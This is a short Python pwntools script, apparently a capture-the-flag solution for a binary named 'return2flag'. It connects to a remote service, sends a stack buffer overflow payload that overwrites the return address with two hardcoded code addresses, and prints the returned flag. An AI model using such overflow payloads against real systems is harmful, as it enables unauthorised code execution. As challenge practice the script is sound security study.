from pwn import *
import sys
r=remote(sys.argv[1],sys.argv[2])
#r=process('return2flag')
for i in range(22):
    line=r.recvline()
r.sendline(b'A'*16+p64(0)+p64(0x401a11)+p64(0)+p64(0x4017f5))
r.recvline()
print(r.recvline().decode().strip())
